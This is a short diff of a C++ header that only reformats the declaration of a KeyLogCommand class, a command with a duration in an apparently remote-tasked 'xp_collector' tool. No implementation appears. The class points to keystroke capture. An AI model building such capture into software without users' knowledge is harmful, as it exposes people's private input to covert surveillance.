@@ -1,18 +1,17 @@
 #pragma once
 #include "Commands/BasicCommand.h"
 
-namespace xp_collector {
-
+namespace xp_collector
+{
 class KeyLogCommand :
-    public BasicCommand
+	public BasicCommand
 {
 public:
-    explicit KeyLogCommand(std::string command_id, CommandType command_type, unsigned int duration);
+	explicit KeyLogCommand(std::string command_id, CommandType command_type, unsigned int duration);
 
-    unsigned int get_duration() const;
+	unsigned int get_duration() const;
 
 private:
-    const unsigned int m_duration;
+	const unsigned int m_duration;
 };
-
 }
